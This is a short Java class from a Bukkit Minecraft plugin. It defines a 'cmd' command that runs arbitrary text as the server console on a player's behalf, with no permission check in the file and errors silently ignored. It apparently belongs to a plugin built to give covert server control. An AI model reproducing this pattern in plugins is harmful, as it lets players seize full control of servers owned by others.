package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class Command_CMD extends CommandBase {

    public Command_CMD() {
        super("cmd", "-", Category.OTHER);
    }

    public void execute(String[] args, Player p) {
        try {
            String CMD = "";

            for (int i = 1; i < args.length; ++i) {
                CMD = CMD + args[i] + " ";
            }

            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), CMD);
            p.sendMessage(Start.INSTANCE.chatPrefix + "Der Befehl wurde in der Konsole ausgeführt!");
        } catch (Exception ignored) {
        }
    }

}
